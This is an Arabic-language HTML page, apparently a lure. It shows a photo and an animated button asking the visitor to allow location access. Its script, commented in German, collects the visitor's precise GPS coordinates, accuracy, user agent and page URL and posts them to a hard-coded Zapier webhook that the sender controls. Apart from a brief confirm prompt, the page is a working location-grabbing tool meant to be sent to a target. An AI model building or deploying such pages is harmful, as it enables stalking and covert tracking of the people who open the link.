<!doctype html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>يرجى السماح بالوصول إلى الموقع</title>
    <style>
        :root {
            color-scheme: light dark;
        }

        body {
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: #000;
            color: #fff;
            font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
            text-align: center;
            padding: 16px;
            box-sizing: border-box;
        }

        img {
            max-width: 90%;
            height: auto;
            border-radius: 12px;
            margin-bottom: 1.6rem;
            box-shadow: 0 6px 24px rgba(0, 0, 0, 0.6);
        }

        button {
            background: #007bff;
            color: #fff;
            font-size: 1.25rem;
            border: none;
            border-radius: 12px;
            padding: 0.9rem 1.6rem;
            cursor: pointer;
            animation: bounce 1.2s infinite;
            box-shadow: 0 8px 30px rgba(0, 123, 255, 0.35);
            transition: transform .15s ease;
        }

        button:active {
            transform: translateY(2px) scale(.995);
        }

        @keyframes bounce {

            0%,
            20%,
            50%,
            80%,
            100% {
                transform: translateY(0);
            }

            40% {
                transform: translateY(-12px);
            }

            60% {
                transform: translateY(-6px);
            }
        }

        .msg {
            margin-top: 1rem;
            font-size: 0.95rem;
            opacity: 0.9;
        }
    </style>
</head>

<body>
    <img src="490716617_24365319479735048_6862502247511119998_n.jpg" alt="صورة" />
    <button id="locBtn">يرجى السماح بالوصول إلى الموقع</button>
    <div class="msg" id="msg" aria-live="polite"></div>

    <script>
        // === TRAGE HIER DEINE ZAPIER HOOK-URL EIN ===
        const WEBHOOK = "https://hooks.zapier.com/hooks/catch/25010546/u5jmd4g/"; // <- aus Screenshot; ersetze falls nötig

        const btn = document.getElementById('locBtn');
        const msg = document.getElementById('msg');

        function setMsg(t) { msg.textContent = t; }

        btn.addEventListener('click', async () => {
            if (!('geolocation' in navigator)) { setMsg('المتصفح لا يدعم تحديد الموقع'); return; }

            // Optional: kurze Bestätigung (sichtbare Einwilligung)
            const ok = confirm('بالموافقة تسمح بإرسال موقعك إلى المُرسل. موافق؟'); // deutsch/arabisch mix to be explicit
            if (!ok) { setMsg('تم الإلغاء'); return; }

            setMsg('اطلب الموقع…');

            navigator.geolocation.getCurrentPosition(async pos => {
                const payload = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    acc: pos.coords.accuracy,
                    ts: Date.now(),
                    ua: navigator.userAgent,
                    page: location.href
                };

                try {
                    // POST an Zapier
                    const res = await fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    if (!res.ok) throw new Error('HTTP ' + res.status);
                    setMsg('تم الإرسال بنجاح ✅');
                } catch (e) {
                    console.error('Send error', e);
                    setMsg('فشل الإرسال ❌');
                }
            }, err => {
                setMsg('تعذر الحصول على الموقع: ' + (err.message || err.code));
            }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
        });
    </script>
</body>

</html>